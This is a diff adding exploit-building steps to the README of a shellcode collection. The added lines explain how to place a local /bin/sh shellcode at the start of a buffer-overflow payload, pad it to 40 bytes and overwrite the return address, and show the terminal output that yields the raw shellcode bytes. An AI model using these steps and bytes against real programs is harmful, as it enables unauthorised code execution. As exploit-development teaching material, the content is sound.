@@ -27,6 +27,30 @@ To install:
 Each folder containing shellcode has at least two files. A .s file containg the assembly and a makefile. Typing make in a folder will assemble the shellcode as a raw binary file called `shellcode` and generate an ELF binary for testing called `testShellcode`. Shellcode that cannot be tested by running `testShellcode` alone will have other instructions. You can also test the shellcode by incorporating it into a working exploit. If you would like to hardcode the shellcode into your exploit instead of reading it from the shellcode file you can use the [shellcode as array python script.](https://github.com/isislab/Shellcode/blob/master/shellcodeAsArray/sa.py)
 
 
+Run ‘make’ to compile the shellcode
+Leverage the ‘shellcodeAsArray’ Python script to convert the shellcode to a hex array for use within a Python script
+Place the hex array at the beginning of our payload
+Pad the unused bytes with whatever we’d like (confirm the total bytes before the return address is 40)
+Replace the 8 “B”s with the value of the “Location” address
+# git clone https://github.com/isislab/Shellcode.git
+Cloning into 'Shellcode'...
+remote: Counting objects: 925, done.
+remote: Total 925 (delta 0), reused 0 (delta 0), pack-reused 925
+Receiving objects: 100% (925/925), 9.22 MiB | 12.31 MiB/s, done.
+Resolving deltas: 100% (406/406), done.
+# cd Shellcode/64BitLocalBinSh/
+# make
+nasm -f elf64 shell64.s -I ../include/ -I ../include/runtime/ -o linkme.o
+nasm shell64.s -I ../include/ -I ../include/runtime/ -o shellcode
+gcc linkme.o -o testShellcode 
+# python ../shellcodeAsArray/sa.py shellcode 
+shellcode = ( "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0"
+"\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
+)
+
+
+
+
 ####Configuring
 The behaviour of most shellcode instances can be configured with `%define`s. Here are some examples:
 
